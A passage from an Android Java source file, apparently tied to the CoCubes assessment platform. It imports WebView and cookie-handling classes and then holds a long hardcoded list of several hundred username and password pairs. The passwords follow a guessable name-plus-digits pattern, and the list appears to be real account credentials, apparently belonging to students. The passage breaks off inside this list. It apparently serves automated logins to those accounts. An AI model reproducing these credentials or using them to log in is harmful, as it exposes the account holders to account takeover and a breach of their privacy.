package app.driver.com.cocubes;

import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
        
        String DATA2 = "";
        
    String DATA = "sujeatkumarsoni\tsujeat8768\n" +
            "aakashsachdev\taakash8055\n" +
            "abhigyan22611\tabhigy8667\n" +
            "achalsinghmewara\tachals5916\n" +
            "adarshmohit\tadarsh6081\n" +
            "adityaparsodiya\taditya4514\n" +
            "ajaysing84171\tajaysi3674\n" +
            "ajitkumaranand\tajitku4443\n" +
            "akhilkum57261\takhilk3588\n" +
            "akshaynagle\takshay8821\n" +
            "alexthoma\talexth6299\n" +
            "amankush28361\tamanku8485\n" +
            "amitchau96761\tamitch2464\n" +
            "amitchou69971\tamitch5115\n" +
            "ankanlahiri\tankanl5569\n" +
            "ankitcho36251\tankitc2634\n" +
            "ankitkum54681\tankitk3531\n" +
            "anshulsa30511\tanshul2889\n" +
            "anuragvi87741\tanurag6034\n" +
            "arpitjai44541\tarpitj1463\n" +
            "ashishgu54601\tashish6218\n" +
            "ashishku61201\tashish2584\n" +
            "ashishsh72021\tashish8198\n" +
            "ashwingarg\tashwin3072\n" +
            "atulkumarprasad\tatulku2391\n" +
            "avinashk41601\tavinas9860\n" +
            "ayushdix92261\tayushd5757\n" +
            "ayushreja\tayushr8017\n" +
            "bhupendraamrohi\tbhupen5636\n" +
            "chandrab37671\tchandr7087\n" +
            "chetan242\tchetan9946\n" +
            "deepakbawasker\tdeepak7825\n" +
            "deepakku99152\tdeepak8364\n" +
            "deepakku63391\tdeepak6555\n" +
            "devendra78921\tdevend3545\n" +
            "dhyanendrapethari\tdhyane3175\n" +
            "diwakark85641\tdiwaka9753\n" +
            "dushyantchourasia\tdushya4750\n" +
            "gauravla54301\tgaurav7268\n" +
            "gauravrahalkar\tgaurav2148\n" +
            "gauravsa48411\tgaurav8481\n" +
            "gouravso92671\tgourav4282\n" +
            "gulshankumarrai\tgulsha2686\n" +
            "hardikja94041\thardik4017\n" +
            "harinarayanathiya\tharina8015\n" +
            "harshsuman\tharshs8657\n" +
            "hasanatanzar\thasana8159\n" +
            "himanshupatsariya\thimans4037\n" +
            "jitendra72861\tjitend9833\n" +
            "jitendra60421\tjitend1582\n" +
            "keshavprasadtiwari\tkeshav9526\n" +
            "keshavya92151\tkeshav1369\n" +
            "kumargau22961\tkumarg9471\n" +
            "kumarman20061\tkumarm8567\n" +
            "kumarshi45951\tkumars7373\n" +
            "kunaldhanwani\tkunald7082\n" +
            "mahadeepraghuwanshi\tmahade1131\n" +
            "mahendradohare\tmahend8557\n" +
            "maneeshv89501\tmanees8228\n" +
            "manishbh89591\tmanish3321\n" +
            "mayankag48861\tmayank6579\n" +
            "mayankspandey\tmayank6716\n" +
            "mdwaheed8\tmdwahe2154\n" +
            "milankum74341\tmilank6105\n" +
            "mohitbagora\tmohitb4258\n" +
            "dulverma3\tdulver1390\n" +
            "naitikkum\tnaitik9931\n" +
            "narendrasinghlodhi\tnarend3010\n" +
            "navneetj94471\tnavnee5221\n" +
            "neerajchadar\tneeraj2283\n" +
            "neerajparmeshwarya\tneeraj9510\n" +
            "neeteshtiwari\tneetes7078\n" +
            "nileshkumarrajwar\tnilesh5913\n" +
            "nitinpat10961\tnitinp6139\n" +
            "pappukum13991\tpappuk9056\n" +
            "piyushpr75991\tpiyush5639\n" +
            "priyankturkar\tpriyan6512\n" +
            "priyanshtripathi\tpriyan8986\n" +
            "priyaranjankhare\tpriyar2133\n" +
            "rahulkumarverman\trahulk6037\n" +
            "rahulsin78371\trahuls9026\n" +
            "rahulver13101\trahulv9090\n" +
            "rajbeersinghahirwar\trajbee4852\n" +
            "rajeevra36021\trajeev7068\n" +
            "rajeevra80121\trajeev5489\n" +
            "rajendra66201\trajend3338\n" +
            "rajivran24181\trajivr2291\n" +
            "ramkumarraman\tramkum9085\n" +
            "ramjilodhi\tramjil6561\n" +
            "rangeshkrvishwakarma\tranges3384\n" +
            "ranvijay56481\tranvij7415\n" +
            "ravikuma76361\traviku9498\n" +
            "rishabha94811\trishab3034\n" +
            "riteshku98621\tritesh1566\n" +
            "rohitkum69261\trohitk8961\n" +
            "rohitkum62971\trohitk2230\n" +
            "rohitkum53601\trohitk2218\n" +
            "rupeshnema\trupesh3951\n" +
            "sachinsh37461\tsachin3037\n" +
            "saileshsinghchauhan\tsailes6566\n" +
            "saiyedameen\tsaiyed8261\n" +
            "santoshk11431\tsantos4085\n" +
            "sauravchaubey\tsaurav6925\n" +
            "shaktisaurav\tshakti5192\n" +
            "shalendrakumarpatel\tshalen2089\n" +
            "shauryasinghbaghel\tshaury2850\n" +
            "shekharsakalkar\tshekha1827\n" +
            "shivendr72041\tshiven7446\n" +
            "shubhama85611\tshubha7657\n" +
            "shubhambo\tshubha7039\n" +
            "shubhamkarode\tshubha6929\n" +
            "shubhamkaroliya\tshubha7866\n" +
            "shubhamk99721\tshubha8263\n" +
            "shubhamshilpkar\tshubha2460\n" +
            "simarpreetarora\tsimarp1042\n" +
            "sonukuma92921\tsonuku7038\n" +
            "sudeepson\tsudeep2909\n" +
            "sumitver21041\tsumitv1140\n" +
            "suneelku69601\tsuneel3879\n" +
            "suryadevk\tsuryad2209\n" +
            "tusharsh41491\ttushar5806\n" +
            "upendras32761\tupendr9368\n" +
            "vaibhavv41541\tvaibha9505\n" +
            "varundengale\tvarund5464\n" +
            "vijaykumarbunkar\tvijayk2581\n" +
            "vikaskhatarkar\tvikask9023\n" +
            "vikasuikey\tvikasu2534\n" +
            "vikashkumargputa\tvikash8638\n" +
            "vikendras\tvikend1427\n" +
            "vikkyanan\tvikkya1009\n" +
            "vinaykum94051\tvinayk5621\n" +
            "vivekpra10471\tvivekp9967\n" +
            "vyankteshson\tvyankt8390\n" +
            "yashagra23691\tyashag1250\n" +
            "aakrtibhalekar\taakrti6258\n" +
            "aayushiso\taayush1566\n" +
            "abhishek61421\tabhish2232\n" +
            "adityapa80161\taditya9632\n" +
            "adityaup74071\taditya4282\n" +
            "amandiwak\tamandi9522\n" +
            "anamikath\tanamik9898\n" +
            "aniruddh86371\tanirud8187\n" +
            "anjalipa10471\tanjali6876\n" +
            "ankityad23751\tankity3847\n" +
            "anujchourasia\tanujch8431\n" +
            "apurvadaksh\tapurva5758\n" +
            "bhupendr87531\tbhupen1464\n" +
            "deekshar22401\tdeeksh6390\n" +
            "deepalik87831\tdeepal2816\n" +
            "deepikabeelwan\tdeepik9005\n" +
            "deeptisa40191\tdeepti6725\n" +
            "devendra97541\tdevend8050\n" +
            "dhirendagautam\tdhiren6411\n" +
            "dianaphilip\tdianap1148\n" +
            "himanshuasati\thimans8274\n" +
            "ishwarprasadkurmi\tishwar7825\n" +
            "juhikaushal\tjuhika7927\n" +
            "kartikdhanaitkar\tkartik6473\n" +
            "kartikja43011\tkartik2344\n" +
            "ketannagariya\tketann2758\n" +
            "khushboo85181\tkhushb2513\n" +
            "koushaljain\tkousha3355\n" +
            "krishnak90631\tkrishn2145\n" +
            "kushagrapanchal\tkushag9654\n" +
            "lokeshdhakad\tlokesh6946\n" +
            "mayankraghuvanshi\tmayank9557\n" +
            "mayurtayde\tmayurt4841\n" +
            "mayurimaratha\tmayuri5914\n" +
            "monikash50791\tmonika8676\n" +
            "nikhilch56101\tnikhil2683\n" +
            "nikhilra29391\tnikhil9116\n" +
            "nikitashanamdeo\tnikita7419\n" +
            "nishakanttomar\tnishak3644\n" +
            "nityaagrawal\tnityaa6338\n" +
            "palakshr62001\tpalaks3709\n" +
            "pallavikalway\tpallav2156\n" +
            "paridhiporwal\tparidh5528\n" +
            "parulmalviya\tparulm8462\n" +
            "poojapatle\tpoojap3310\n" +
            "prachiag85141\tprachi7660\n" +
            "pragyasi82411\tpragya5694\n" +
            "prekshaj55591\tpreksh6692\n" +
            "priyanka95841\tpriyan4686\n" +
            "rahulchandnani\trahulc7398\n" +
            "rahultiw93151\trahult4433\n" +
            "rampratapthakur\trampra3673\n" +
            "riyaagarw\triyaag1863\n" +
            "rohitthor\trohitt2099\n" +
            "rupalimuley\trupali8868\n" +
            "sakshiya70151\tsakshi6881\n" +
            "samiksharawat\tsamiks5943\n" +
            "samiyakh47611\tsamiya8498\n" +
            "samridhikaurkhanuja\tsamrid2417\n" +
            "sandeepp61931\tsandee5781\n" +
            "sandeepp20421\tsandee7179\n" +
            "shahrukh14341\tshahru2108\n" +
            "shobhitk66071\tshobhi7122\n" +
            "shreya953\tshreya3733\n" +
            "shreyaag62441\tshreya7022\n" +
            "shrutish85621\tshruti1035\n" +
            "shubhamg30061\tshubha5620\n" +
            "shubhamp33371\tshubha2447\n" +
            "shubhams68971\tshubha8255\n" +
            "siddhart86191\tsiddha7105\n" +
            "siddhart93721\tsiddha8677\n" +
            "somyagadia\tsomyag1464\n" +
            "soumyagu40571\tsoumya1797\n" +
            "surajkum81661\tsurajk8492\n" +
            "surbhikanungo\tsurbhi2617\n" +
            "swatipat82721\tswatip7252\n" +
            "sweetymalviya\tsweety3984\n" +
            "tanyajai67991\ttanyaj8713\n" +
            "tanyaladdha\ttanyal8799\n" +
            "tanyamal16691\ttanyam5254\n" +
            "tarushrivastava\ttarush5493\n" +
            "vigyachaturvedi\tvigyac8365\n" +
            "vikasjyoti\tvikasj3623\n" +
            "yashaswisharma\tyashas9992\n" +
            "prajwalgaharwar\tprajwa7380\n" +
            "abhishekchakravarti\tabhish5144\n" +
            "abhishek89231\tabhish6032\n" +
            "abhishek20612\tabhish3429\n" +
            "abhishek35492\tabhish6324\n" +
            "adityaja80501\taditya2364\n" +
            "adityapa52391\taditya4626\n" +
            "aishwaryachoubey\taishwa8748\n" +
            "aishwary42351\taishwa4291\n" +
            "ajeetkum68191\tajeetk2667\n" +
            "akshatsa71911\takshat2403\n" +
            "akshaytamrakar\takshay8739\n" +
            "amitkuma67481\tamitku8684\n" +
            "amitkuma33311\tamitku6676\n" +
            "amitsahu27011\tamitsa2369\n" +
            "anishana56361\tanisha8282\n" +
            "ankitapa66771\tankita2705\n" +
            "ankitash91671\tankita6107\n" +
            "ankurkum27431\tankurk4125\n" +
            "ankursable\tankurs8996\n" +
            "ankurshr22441\tankurs6635\n" +
            "anmolvarma\tanmolv2802\n" +
            "anushreenair\tanushr1489\n" +
            "arpitmalv\tarpitm3200\n" +
            "artigupt99751\tartigu2187\n" +
            "batsalabala\tbatsal5311\n" +
            "chandrak92521\tchandr6349\n" +
            "chhayaku99941\tchhaya9602\n" +
            "deekshaj63431\tdeeksh5620\n" +
            "devikaparashar\tdevika4167\n" +
            "dharmend76261\tdharme7203\n" +
            "dilipcheepa\tdilipc6638\n" +
            "divyapakhre\tdivyap1450\n" +
            "divyapakhre\tdivyap1450\n" +
            "divyatulsani\tdivyat5989\n" +
            "harshend37661\tharshe5613\n" +
            "hemantma77511\themant7440\n" +
            "hiteshaarora\thitesh6695\n" +
            "ieragupta\tieragu4873\n" +
            "ipsitpriya\tipsitp6581\n" +
            "ishakuma94991\tishaku2392\n" +
            "ishwaridubey\tishwar2140\n" +
            "itishasha\titisha1386\n" +
            "jayakrishna\tjayakr4500\n" +
            "jayantsinghsengar\tjayant7427\n" +
            "jonakyghosh\tjonaky6003\n" +
            "jyotibas33401\tjyotib2625\n" +
            "jyotisin50191\tjyotis5832\n" +
            "kuldeeps66221\tkuldee3468\n" +
            "maneeshkumarsoni\tmanees9525\n" +
            "manojkum61971\tmanojk2655\n" +
            "moulikdhade\tmoulik7559\n" +
            "mukteshwarkumar\tmuktes2998\n" +
            "naineejain\tnainee6153\n" +
            "nehachirad\tnehach2200\n" +
            "niharikasharan\tnihari3319\n" +
            "nikhilbh92291\tnikhil2017\n" +
            "nikitash20911\tnikita5098\n" +
            "nikitasumer\tnikita1817\n" +
            "nikkiubbey\tnikkiu4227\n" +
            "poojawahane\tpoojaw8659\n" +
            "pradeepk96711\tpradee9589\n" +
            "prajulbhatnagar\tprajul5780\n" +
            "prakharvarshney\tprakha5320\n" +
            "pratibha90551\tpratib3833\n" +
            "priyabagde\tpriyab3800\n" +
            "priyanka49761\tpriyan3084\n" +
            "priyankatalreja\tpriyan5228\n" +
            "priyanshp\tpriyan3001\n" +
            "purnaankrai\tpurnaa8185\n" +
            "pushpamprakash\tpushpa6608\n" +
            "rajrawat6\trajraw2735\n" +
            "rajankum33001\trajank1374\n" +
            "rajatagr39101\trajata6735\n" +
            "rajatchouhan\trajatc7902\n" +
            "rajeevra57171\trajeev5353\n" +
            "rajukumarverma\trajuku1526\n" +
            "ramprakashbais\trampra2609\n" +
            "rohitkum60762\trohitk6321\n" +
            "sachinku14261\tsachin5720\n" +
            "sakshiag16741\tsakshi2164\n" +
            "sameeksh26941\tsameek3051\n" +
            "sanjeevbagri\tsanjee3318\n" +
            "saumyash88341\tsaumya7320\n" +
            "saurabh168671\tsaurab9996\n" +
            "saurabhkumarlanjewar\tsaurab7408\n" +
            "shailendrasinghkain\tshaile1464\n" +
            "shellytiwari\tshelly3732\n" +
            "shivam703\tshivam2793\n" +
            "shivambh44501\tshivam1475\n" +
            "shobhits47461\tshobhi7197\n" +
            "shubhamp12861\tshubha8865\n" +
            "shubhamr25971\tshubha6812\n" +
            "shubhams70561\tshubha2308\n" +
            "shuchija75781\tshuchi1163\n" +
            "smritigedam\tsmriti5571\n" +
            "someshtr48801\tsomesh8233\n" +
            "sonalira73381\tsonali6197\n" +
            "soumyaja56671\tsoumya5591\n" +
            "sudeepsh62851\tsudeep9207\n" +
            "tanvirathore\ttanvir3915\n" +
            "tarunkumarkoli\ttarunk3393\n" +
            "tarunachadokar\ttaruna8631\n" +
            "urvashiramnani\turvash2270\n" +
            "ushaahirwar\tushaah4965\n" +
            "vaibhavv17061\tvaibha2300\n" +
            "vaishakbaburaj\tvaisha9584\n" +
            "vaishakhmkurup\tvaisha2764\n" +
            "vaishalidarwai\tvaisha5067\n" +
            "vikrantketugaurav\tvikran3672\n" +
            "vishalsr65051\tvishal2777\n" +
            "visheshm60121\tvishes3954\n" +
            "vishwaje67041\tvishwa7760\n" +
            "yashpanch\tyashpa2837\n" +
            "aayushsa85481\taayush2529\n" +
            "abhinavbangard\tabhina7722\n" +
            "abhinavy39001\tabhina4961\n" +
            "abhinawan\tabhina8402\n" +
            "abhishek46631\tabhish3675\n" +
            "abhishek63071\tabhish1427\n" +
            "abhishek16052\tabhish4174\n" +
            "abhishek40742\tabhish7189\n" +
            "ajaykatar\tajayka4666\n" +
            "amanbajpa\tamanba5793\n" +
            "amarkuma54101\tamarku6599\n" +
            "aniketaga\taniket3982\n" +
            "aniketpendse\taniket2403\n" +
            "anitakum66831\tanitak7801\n" +
            "ankitkum62771\tankitk2452\n" +
            "anmolraj8\tanmolr1301\n" +
            "anujsabarwal\tanujsa4335\n" +
            "archigupta\tarchig8638\n" +
            "arpitrai63981\tarpitr9777\n" +
            "ashwanik36611\tashwan5477\n" +
            "astharawa\tasthar5645\n" +
            "atultiwa78811\tatulti1897\n" +
            "avnikanchan\tavnika4827\n" +
            "ayushsha79291\tayushs8168\n" +
            "ayushish11911\tayushi5529\n" +
            "bharatdub\tbharat7389\n" +
            "chandreshvishwakarma\tchandr6858\n" +
            "chitrabhandari\tchitra1333\n" +
            "daminisi70831\tdamini5777\n" +
            "devendra72241\tdevend7110\n" +
            "devendrapratapgehlot\tdevend7392\n" +
            "garimaja71301\tgarima9521\n" +
            "garimase47961\tgarima5837\n" +
            "gauravmeharwal\tgaurav6285\n" +
            "himanshu67482\thimans2449\n" +
            "jayatinayak\tjayati3216\n" +
            "khushbuv27721\tkhushb3860\n" +
            "kratikap19021\tkratik2881\n" +
            "krishnadevanand\tkrishn4171\n" +
            "kritikashandilya\tkritik3385\n" +
            "kshamasin\tkshama9393\n" +
            "kunalkashyapjha\tkunalk5622\n" +
            "nesaralam\tnesara8952\n" +
            "nidhimongoriya\tnidhim3310\n" +
            "nikhilja27871\tnikhil8934\n" +
            "niteshkohli\tnitesh3589\n" +
            "nitinmourya\tnitinm4330\n" +
            "omprakashsinghtomar\tomprak2050\n" +
            "pankajpawar\tpankaj5805\n" +
            "parulkumarpal\tparulk7994\n" +
            "poojaraja\tpoojar4935\n" +
            "poonamku29551\tpoonam3113\n" +
            "prakhara65361\tprakha6717\n" +
            "pramodku69261\tpramod4752\n" +
            "preetibh78621\tpreeti3340\n" +
            "purvataranekar\tpurvat7503\n" +
            "raavisoni\traavis1549\n" +
            "rahulpat83951\trahulp6697\n" +
            "rajeshku90531\trajesh8343\n" +
            "rajnibal88011\trajnib2124\n" +
            "ravikant97001\travika1659\n" +
            "riyajain6\triyaja8382\n" +
            "rohisinghai\trohisi6773\n" +
            "roliarjaria\troliar2022\n" +
            "sandeepanuragi\tsandee4640\n" +
            "sandeeppanna\tsandee4186\n" +
            "sankalps36101\tsankal7093\n" +
            "saurabhkumarpanthi\tsaurab1386\n" +
            "sejalnaidu\tsejaln5820\n" +
            "shalinip90081\tshalin4716\n" +
            "shashikes\tshashi6416\n" +
            "shishranjansingh\tshishr4704\n" +
            "shriyakumawat\tshriya1703\n" +
            "shrutigu72531\tshruti7445\n" +
            "shubhamgarge\tshubha4604\n" +
            "shubhams20311\tshubha2091\n" +
            "sonamjai73731\tsonamj9221\n" +
            "sourabhnathagrawal\tsourab5412\n" +
            "srishtimanwarey\tsrisht8124\n" +
            "sudeeptijharia\tsudeep9128\n" +
            "sunilmee21801\tsunilm6728\n" +
            "surajkum97261\tsurajk5272\n" +
            "surendra94501\tsurend2026\n" +
            "surendrasinghathiya\tsurend5449\n" +
            "swikar230\tswikar6969\n" +
            "tarunkum30221\ttarunk7386\n" +
            "utakarshnema\tutakar9874\n" +
            "vikashku80691\tvikash7342\n" +
            "vipulgup10331\tvipulg8775\n" +
            "vivekahirwar\tviveka7287\n" +
            "yashgolchha\tyashgo2573\n" +
            "yogitakhatarkar\tyogita3871\n" +
            "zakialam8\tzakial5204\n" +
            "aakashch35451\taakash5590\n" +
            "aakritiup\taakrit7031\n" +
            "aasthagou\taastha3381\n" +
            "abhinavn58071\tabhina9827\n" +
            "abhishek76581\tabhish9638\n" +
            "adityajad\taditya3740\n" +
            "ajaysing73581\tajaysi5111\n" +
            "akanchhaj\takanch4087\n" +
            "akanksha18041\takanks8488\n" +
            "akanksha49731\takanks2285\n" +
            "akanshas49391\takansh7840\n" +
            "akratikul\takrati7567\n" +
            "alkataiwa\talkata6417\n" +
            "anantgiri\tanantg8476\n" +
            "anchaltam\tanchal5101\n" +
            "anjalipa64701\tanjali1815\n" +
            "anjanaya77181\tanjana1034\n" +
            "ankitgup43601\tankitg4185\n" +
            "ankitkhaw\tankitk5154\n" +
            "ankurgup90041\tankurg7469\n" +
            "anubhavkr\tanubha8460\n" +
            "apekshac35091\tapeksh9798\n" +
            "arpitjai40501\tarpitj2490\n" +
            "bhartidub\tbharti5789\n" +
            "deepakpr73511\tdeepak5850\n" +
            "devendra53411\tdevend7069\n" +
            "divyabha86661\tdivyab1333\n" +
            "divyajai67121\tdivyaj6966\n" +
            "divyaven49561\tdivyav7626\n" +
            "gamineesh\tgamine4315\n" +
            "gauravku60021\tgaurav3954\n" +
            "gopalbiss\tgopalb5521\n" +
            "gunjanku20441\tgunjan9494\n" +
            "gyanchan89291\tgyanch4115\n" +
            "harshbhad\tharshb8443\n" +
            "honeysulk\thoneys9119\n" +
            "hussainlu\thussai6216\n" +
            "juhibhair\tjuhibh5662\n" +
            "kajallang\tkajall5773\n" +
            "kavitaku64671\tkavita4473\n" +
            "keshavvij\tkeshav5484\n" +
            "khushboo47341\tkhushb9887\n" +
            "kritikab66501\tkritik1577\n" +
            "lalimanag\tlalima2004\n" +
            "lokeshba54371\tlokesh3482\n" +
            "manjumee64941\tmanjum7586\n" +
            "mayurish29901\tmayuri3225\n" +
            "meenaksh93461\tmeenak9809\n" +
            "nandanaph\tnandan4767\n" +
            "nayansha97571\tnayans4847\n" +
            "neelammal\tneelam3761\n" +
            "nileshmul\tnilesh3406\n" +
            "oshinmoha\toshinm1045\n" +
            "pankajso81821\tpankaj2199\n" +
            "piyushka44821\tpiyush6425\n" +
            "poojakolh\tpoojak8964\n" +
            "poonampa45781\tpoonam6682\n" +
            "prachira56061\tprachi3370\n" +
            "prateekd95721\tpratee2689\n" +
            "priyagou10771\tpriyag8872\n" +
            "pushkarp35961\tpushka4182\n" +
            "rahulkum65971\trahulk6823\n" +
            "rakshave13161\traksha4378\n" +
            "rashibah66221\trashib8876\n" +
            "ravindra35191\travind7459\n" +
            "riteshso79341\tritesh9053\n" +
            "ritujain7\trituja9581\n" +
            "riyamalvi\triyama4305\n" +
            "rohittom46751\trohitt9361\n" +
            "samikshar\tsamiks2368\n" +
            "sandhyab29001\tsandhy3366\n" +
            "saumyaja64221\tsaumya6290\n" +
            "shikhaag42841\tshikha1252\n" +
            "shivamch44611\tshivam7684\n" +
            "shrutiag69971\tshruti5321\n" +
            "shubhams98301\tshubha1111\n" +
            "shubhamt69201\tshubha5897\n" +
            "sonalimi29121\tsonali4351\n" +
            "srashtidh\tsrasht6750\n" +
            "sreemoye66261\tsreemo8168\n" +
            "stutikha39331\tstutik4531\n" +
            "supriyaj93821\tsupriy6782\n" +
            "swatikau21671\tswatik5662\n" +
            "swatikum47391\tswatik6547\n" +
            "urvashijo\turvash7371\n" +
            "vandanad26951\tvandan4996\n" +
            "varshagou\tvarsha3376\n" +
            "vasundha19301\tvasund4008\n" +
            "vedantbh82031\tvedant9787\n" +
            "viditsha77091\tvidits3450\n" +
            "vinitakha\tvinita7305\n" +
            "vithikash\tvithik9896\n" +
            "vrishalic\tvrisha6345\n" +
            "urvashis33611\turvash3630\n" +
            "aanchalbi\taancha7379\n" +
            "aartisha23011\taartis9045\n" +
            "abhinavs34071\tabhina1538\n" +
            "aishwary39171\taishwa3831\n" +
            "akshayjh76771\takshay6505\n" +
            "anjaliga64271\tanjali7836\n" +
            "anjalish35171\tanjali6583\n" +
            "ankitupa52551\tankitu1627\n" +
            "arushija95441\tarushi4704\n" +
            "ashishaw70891\tashish5989\n" +
            "asrazubai\tasrazu3001\n" +
            "bharatku29441\tbharat8899\n" +
            "bholeshbh\tbholes7102\n" +
            "diwakart87161\tdiwaka6108\n" +
            "eshapreet\teshapr5202\n" +
            "garimaka19011\tgarima9444\n" +
            "ishitayad\tishita1571\n" +
            "kanhaiya19011\tkanhai3003\n" +
            "katyayini\tkatyay5481\n" +
            "kirtidhak\tkirtid3120\n" +
            "kishanku32551\tkishan4201\n" +
            "madanmoh45101\tmadanm1230\n" +
            "mallikapa\tmallik8777\n" +
            "zaidansa21651\tzaidan5697\n" +
            "mohinipa54241\tmohini7579\n" +
            "mohitkum13671\tmohitk7270\n" +
            "nalkumar2\tnalkum8194\n" +
            "nadeemkh66771\tnadeem1352\n" +
            "nagmamans\tnagmam2640\n" +
            "neerajgu62711\tneeraj7640\n" +
            "neerajku53771\tneeraj9355\n" +
            "nidhicho11461\tnidhic6304\n" +
            "nidhipat28211\tnidhip6927\n" +
            "nishikasi\tnishik2937\n" +
            "ojaswisin\tojaswi3016\n" +
            "omprakas43851\tomprak1948\n" +
            "p.vijayk46811\tp.vija5856\n" +
            "parthsaby\tparths6935\n" +
            "praveendh\tpravee1514\n" +
            "praveens21011\tpravee3134\n" +
            "prernashr\tprerna8370\n" +
            "princeku63421\tprince1194\n" +
            "priyanka72102\tpriyan1836\n" +
            "rahiltaiw\trahilt7245\n" +
            "rahulsha44741\trahuls9521\n" +
            "rajnipra83481\trajnip8837\n" +
            "ravianan40761\travian3705\n" +
            "rishirajp\trishir3766\n" +
            "rohityad63771\trohity1183\n" +
            "rupsinghp\trupsin5299\n" +
            "rushtamsi\trushta4259\n" +
            "sagorikad\tsagori7624\n" +
            "sakshidu61241\tsakshi2974\n" +
            "sanjayme69501\tsanjay2380\n" +
            "shraddha75821\tshradd8292\n" +
            "shrikant67611\tshrika7778\n" +
            "shriyalah\tshriya4749\n" +
            "shwetamag\tshweta1742\n" +
            "somyajai27231\tsomyaj4431\n" +
            "sonalidi67561\tsonali1025\n" +
            "sunildhak\tsunild6060\n" +
            "sushilbh83051\tsushil5008\n" +
            "tanmaykha\ttanmay2446\n" +
            "yashikapa\tyashik9411\n" +
            "aakashlow\taakash1429\n" +
            "akanksha45411\takanks3110\n" +
            "animeshdi\tanimes6670\n" +
            "ankukuma67811\tankuku4471\n" +
            "annuanan80881\tannuan8860\n" +
            "anumita93\tanumit1618\n" +
            "artikuma55701\tartiku4498\n" +
            "ashutosh15571\tashuto3675\n" +
            "ayushidu38881\tayushi5975\n" +
            "bhartishr\tbharti1160\n" +
            "chandank24201\tchanda4962\n" +
            "divyacha36111\tdivyac8565\n" +
            "faizalkh14491\tfaizal4057\n" +
            "harshmark\tharshm3495\n" +
            "himanikha\thimani3732\n" +
            "ilasuman7\tilasum4917\n" +
            "jainathan\tjainat3080\n" +
            "yashitaag\tyashit4051\n" +
            "kumarivi76441\tkumari5460\n" +
            "lovelypr23681\tlovely8735\n" +
            "mahinefat\tmahine5886\n" +
            "shahfais38301\tshahfa4083\n" +
            "navodita4\tnavodi6302\n" +
            "omkarpate\tomkarp1168\n" +
            "pragatia79081\tpragat9492\n" +
            "pranaysh94301\tpranay7450\n" +
            "rajubaran\trajuba7160\n" +
            "ranushriv\tranush9178\n" +
            "rishavra72421\trishav2165\n" +
            "riyajain38671\triyaja5048\n" +
            "saritabam\tsarita5899\n" +
            "shivanin68841\tshivan1046\n" +
            "shreyjai88341\tshreyj1846\n" +
            "shrutiaka\tshruti9979\n" +
            "stutibai14831\tstutib9613\n" +
            "umeshthar\tumesht3938\n" +
            "vaibhavs89821\tvaibha9553\n" +
            "abhaydub60071\tabhayd5809\n" +
            "abhishek26641\tabhish6157\n" +
            "abhishek57622\tabhish5670\n" +
            "abinishku\tabinis9844\n" +
            "akshayga98041\takshay2960\n" +
            "akshaymo48561\takshay2252\n" +
            "alokkuma70521\talokku4117\n" +
            "amitkuma91331\tamitku3997\n" +
            "amitkuma68951\tamitku4316\n" +
            "amitsing64881\tamitsi6632\n" +
            "amolboriw\tamolbo4160\n" +
            "anilkaps92121\tanilka9001\n" +
            "anshkhetr\tanshkh2744\n" +
            "anubhavpy\tanubha8574\n" +
            "anuragch23211\tanurag9900\n" +
            "anuragku50401\tanurag3849\n" +
            "ashishahi\tashish3599\n" +
            "ashishch44001\tashish3363\n" +
            "ashutosh21851\tashuto8353\n" +
            "ashwarypa\tashwar4484\n" +
            "braznev46\tbrazne5786\n" +
            "dineshkan\tdinesh2003\n" +
            "gauravgu59761\tgaurav2480\n" +
            "gouravman\tgourav6494\n" +
            "haritsah19111\tharits4062\n" +
            "harshvar30881\tharshv2043\n" +
            "jatinkum56321\tjatink3992\n" +
            "jeetendr57161\tjeeten2711\n" +
            "jituchauk\tjituch6981\n" +
            "lokeshku62971\tlokesh7448\n" +
            "manishku33501\tmanish6392\n" +
            "mayankgu67941\tmayank6806\n" +
            "meghakum99181\tmeghak7581\n" +
            "mohitnarv\tmohitn2880\n" +
            "mohitsin58601\tmohits1629\n" +
            "palashpa69941\tpalash7205\n" +
            "parthdube\tparthd8559\n" +
            "pawanyad24931\tpawany1067\n" +
            "prabhashp\tprabha8698\n" +
            "prafulsat\tpraful9632\n" +
            "pragatid55121\tpragat8210\n" +
            "prasanna58921\tprasan8339\n" +
            "prashant50081\tprasha1137\n" +
            "priyanks32491\tpriyan6149\n" +
            "pushpend69131\tpushpe1701\n" +
            "ranjanku39411\tranjan8327\n" +
            "ravindra51831\travind3329\n" +
            "rishabhs68671\trishab9010\n" +
            "rohitpat81011\trohitp5913\n" +
            "sandeepk88341\tsandee2961\n" +
            "sandeepm76881\tsandee7813\n" +
            "sanjayya58661\tsanjay4420\n" +
            "saurabhg40951\tsaurab6618\n" +
            "shashibh58651\tshashi4916\n" +
            "shivamdu68561\tshivam4527\n" +
            "shivaniki\tshivan9548\n" +
            "shubhamd55651\tshubha5293\n" +
            "shubhamkr\tshubha6082\n" +
            "shubhams71971\tshubha8770\n" +
            "shubhams86931\tshubha7957\n" +
            "sourabhrm\tsourab3440\n" +
            "sudhirku32121\tsudhir4142\n" +
            "sudhirpa16451\tsudhir9892\n" +
            "sunnyagr92161\tsunnya4640\n" +
            "surajsin45521\tsurajs1677\n" +
            "suvratsha\tsuvrat8299\n" +
            "swastikk11261\tswasti8193\n" +
            "syediqba14571\tsyediq6578\n" +
            "ujjawalch\tujjawa2232\n" +
            "vikaskals\tvikask6736\n" +
            "vikaspal76971\tvikasp3343\n" +
            "vikashku24721\tvikash5243\n" +
            "vivekbagr\tvivekb8388\n" +
            "vivekyad52711\tviveky8332\n" +
            "yogeshrac\tyogesh9292\n" +
            "ziaulhaq33851\tziaulh2151\n" +
            "abhayach83751\tabhaya4033\n" +
            "amankuma90991\tamanku6130\n" +
            "amanpriya\tamanpr8095\n" +
            "anuragku13171\tanurag1144\n" +
            "bishavjee\tbishav3473\n" +
            "divyapra66211\tdivyap8818\n" +
            "firozsula\tfirozs7043\n" +
            "harshits79201\tharshi6648\n" +
            "kajol9780\tkajol954347\n" +
            "kumarsan59411\tkumars7564\n" +
            "prabhans47891\tprabha8662\n" +
            "prakritij\tprakri4069\n" +
            "prashant39701\tprasha4333\n" +
            "priyanka85561\tpriyan4138\n" +
            "rajatpat94991\trajatp6426\n" +
            "shivkuma72211\tshivku3713\n" +
            "shubhamlo\tshubha5050\n" +
